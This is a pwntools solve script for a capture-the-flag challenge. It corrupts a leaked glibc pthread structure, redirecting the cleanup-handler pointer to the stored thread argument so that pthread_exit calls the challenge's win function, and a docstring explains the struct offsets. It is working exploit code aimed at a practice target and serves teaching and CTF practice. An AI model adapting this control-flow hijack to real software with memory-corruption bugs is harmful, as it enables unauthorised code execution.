from pwn import *

"""
The thread descriptor (struct pthread
https://elixir.bootlin.com/glibc/glibc-2.39/source/nptl/descr.h#L130)
is given to us, and then we get to overwrite it with anything we want.
After this, pthread_exit is called within the thread function.

We ultimately want to call the win function. PIE is enabled on the binary so we
don't know the address of the win function. Fortunately, it is passed as an
argument to the thread func and this argument is stored in the thread data
(https://elixir.bootlin.com/glibc/glibc-2.39/source/nptl/descr.h#L362).

pthread_exit
(https://elixir.bootlin.com/glibc/glibc-2.39/source/nptl/pthread_exit.c#L25)
internally traverses self->cleanup which a linked list of
_pthread_cleanup_buffer structs. It calls each handler's __routine(__arg).
These function pointers are stored raw in the pthread struct.

So to solve the challenge, we point _pthread_cleanup_buffer to somewhere that
holds the win function's address. We could do this by pointing it to some area
in the data, and then placing the win function's address there. But since the
win function already appears in the data since its an arg, we can just point it
there!

Note that we can easily get the offsets of the field structs by installing
libc6-dbg (on Ubuntu 24.04 which the challenge runs - be careful since it might
be 8 bytes off on different libc versions!) and running under gdb `ptype/o pthread`:

gef> ptype/o pthread
type = struct pthread {
/* ... */
/*    760      |       8 */    _pthread_cleanup_buffer *cleanup;
/* ... */
/*   1592      |       8 */    void *(*start_routine)(void *);
/*   1600      |       8 */    void *arg;
/* ... */
                               /* total size (bytes): 2368 */
                             }
"""

# conn = process('../src/pawsix_thread')
conn = remote('localhost', 1337)

leak = conn.recvline().decode()
pthread_addr = int(leak.split('@ ')[1].split(':')[0], 16)
print('pthread @', hex(pthread_addr))

data = bytearray(bytes.fromhex(leak.split()[-1]))
data[0x2f8:0x300] = p64(pthread_addr + 0x640)

conn.sendlineafter(b'Now, give me your pthread:', bytes(data))

conn.interactive()
